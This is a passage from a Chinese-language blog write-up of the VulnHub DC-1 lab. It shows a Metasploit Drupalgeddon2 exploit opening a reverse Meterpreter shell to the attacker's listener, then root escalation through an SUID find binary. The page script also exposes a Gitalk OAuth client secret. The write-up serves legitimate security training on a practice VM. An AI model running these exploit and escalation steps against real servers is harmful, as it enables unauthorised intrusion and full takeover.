class="hljs-comment">############################</span><br>               <span class="hljs-comment">##############################</span><br>               <span class="hljs-comment">###############################</span><br>              <span class="hljs-comment">###############################</span><br>              <span class="hljs-comment">##############################</span><br>                              <span class="hljs-comment">#    ########   #</span><br>                 <span class="hljs-comment">##        ###        ####   ##</span><br>                                      <span class="hljs-comment">###   ###</span><br>                                    <span class="hljs-comment">####   ###</span><br>               <span class="hljs-comment">####          ##########   ####</span><br>               <span class="hljs-comment">#######################   ####</span><br>                 <span class="hljs-comment">####################   ####</span><br>                  <span class="hljs-comment">##################  ####</span><br>                    <span class="hljs-comment">############      ##</span><br>                       <span class="hljs-comment">########        ###</span><br>                      <span class="hljs-comment">#########        #####</span><br>                    <span class="hljs-comment">############      ######</span><br>                   <span class="hljs-comment">########      #########</span><br>                     <span class="hljs-comment">#####       ########</span><br>                       <span class="hljs-comment">###       #########</span><br>                      <span class="hljs-comment">######    ############</span><br>                     <span class="hljs-comment">#######################</span><br>                     <span class="hljs-comment">#   #   ###  #   #   ##</span><br>                     <span class="hljs-comment">########################</span><br>                      <span class="hljs-comment">##     ##   ##     ##</span><br>                            https://metasploit.com<br><br><br>       =[ metasploit v6.3.16-dev                          ]<br>+ -- --=[ 2315 exploits - 1208 auxiliary - 412 post       ]<br>+ -- --=[ 975 payloads - 46 encoders - 11 nops            ]<br>+ -- --=[ 9 evasion                                       ]<br><br>Metasploit tip: Metasploit can be configured at startup, see <br>msfconsole --<span class="hljs-built_in">help</span> to learn more<br>Metasploit Documentation: https://docs.metasploit.com/<br><br>msf6 &gt; search drupal<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#  Name                                           Disclosure Date  Rank       Check  Description</span><br>   -  ----                                           ---------------  ----       -----  -----------<br>   0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution                                                      <br>   1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection                                                <br>   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection                                                     <br>   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection                                                           <br>   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution                                                    <br>   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE                                                     <br>   6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration                                                             <br>   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution<br><br><br>Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval                                                                             <br><br>msf6 exploit(unix/webapp/drupal_restws_exec) &gt; use 1<br>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options <br><br>Module options (exploit/unix/webapp/drupal_drupalgeddon2):<br><br>   Name         Current Setting  Required  Description<br>   ----         ---------------  --------  -----------<br>   DUMP_OUTPUT  <span class="hljs-literal">false</span>            no        Dump payload <span class="hljs-built_in">command</span> output<br>   PHP_FUNC     passthru         <span class="hljs-built_in">yes</span>       PHP <span class="hljs-keyword">function</span> to execute<br>   Proxies                       no        A proxy chain of format <span class="hljs-built_in">type</span>:host:port[,<span class="hljs-built_in">type</span>:hos<br>                                           t:port][...]<br>   RHOSTS       192.168.56.109   <span class="hljs-built_in">yes</span>       The target host(s), see https://docs.metasploit.<br>                                           com/docs/using-metasploit/basics/using-metasploi<br>                                           t.html<br>   RPORT        80               <span class="hljs-built_in">yes</span>       The target port (TCP)<br>   SSL          <span class="hljs-literal">false</span>            no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections<br>   TARGETURI    /                <span class="hljs-built_in">yes</span>       Path to Drupal install<br>   VHOST                         no        HTTP server virtual host<br><br><br>Payload options (php/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  192.168.56.144   <span class="hljs-built_in">yes</span>       The listen address (an interface may be specified)<br>   LPORT  4444             <span class="hljs-built_in">yes</span>       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic (PHP In-Memory)<br><br><br><br>View the full module info with the info, or info -d <span class="hljs-built_in">command</span>.<br><br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit <br><br>[*] Started reverse TCP handler on 192.168.56.144:4444 <br>[*] Running automatic check (<span class="hljs-string">&quot;set AutoCheck false&quot;</span> to <span class="hljs-built_in">disable</span>)<br>[!] The service is running, but could not be validated.<br>[*] Sending stage (39927 bytes) to 192.168.56.109<br>[*] Meterpreter session 1 opened (192.168.56.144:4444 -&gt; 192.168.56.109:54480) at 2023-05-27 16:10:19 +0800<br><br>meterpreter &gt; <span class="hljs-built_in">pwd</span><br>/var/www<br>meterpreter &gt; getuid<br>Server username: www-data<br>meterpreter &gt; <br></code></pre></td></tr></table></figure>

<p>我们用了0，4，都没有成功，用了1成功了。</p>
<p>然后此处可以直接shell获取shell或者自己传个反弹shell上去也行。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>sudo -l</code>会发现sudo被扣掉了。</p>
<p>查看设置的SUID的二进制文件</p>
<p><code>find / -type f -perm -u=s -ls 2&gt;/dev/null</code></p>
<p>发现<code>find</code>本身设置了s位。</p>
<p>直接利用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-1:/usr/bin$ ./find . -<span class="hljs-built_in">exec</span> /bin/sh -p \; -quit    <br>/bin/sh: 0: Illegal option -p<br></code></pre></td></tr></table></figure>

<p><code>-p</code>选项用不了，去掉试试。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-1:/usr/bin$ find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit     <br>find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># cd ~</span><br><span class="hljs-built_in">cd</span> ~<br>/bin/sh: 2: <span class="hljs-built_in">cd</span>: can<span class="hljs-string">&#x27;t cd to ~</span><br><span class="hljs-string"># cd /root</span><br><span class="hljs-string">cd /root</span><br><span class="hljs-string"># ls -la</span><br><span class="hljs-string">ls -la</span><br><span class="hljs-string">total 32</span><br><span class="hljs-string">drwx------  4 root root 4096 Feb 28  2019 .</span><br><span class="hljs-string">drwxr-xr-x 23 root root 4096 Feb 19  2019 ..</span><br><span class="hljs-string">drwx------  2 root root 4096 Feb 19  2019 .aptitude</span><br><span class="hljs-string">-rw-------  1 root root   44 Feb 28  2019 .bash_history</span><br><span class="hljs-string">-rw-r--r--  1 root root  949 Feb 19  2019 .bashrc</span><br><span class="hljs-string">drwxr-xr-x  3 root root 4096 Feb 19  2019 .drush</span><br><span class="hljs-string">-rw-r--r--  1 root root  140 Nov 20  2007 .profile</span><br><span class="hljs-string">-rw-r--r--  1 root root  173 Feb 19  2019 thefinalflag.txt</span><br><span class="hljs-string"># cat thefinalflag.txt</span><br><span class="hljs-string">cat thefinalflag.txt</span><br><span class="hljs-string">Well done!!!!</span><br><span class="hljs-string"></span><br><span class="hljs-string">Hopefully you&#x27;</span>ve enjoyed this and learned some new skills.<br><br>You can <span class="hljs-built_in">let</span> me know what you thought of this little journey<br>by contacting me via Twitter - @DCAU7<br></code></pre></td></tr></table></figure>

<p>轻松提权。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/05/28/DC-2/">← Next [vulnhub]  DC:2</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/26/Fowsniff/">[vulnhub]  Fowsniff Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">2.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">2.2.</span> <span class="toc-text">web渗透</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>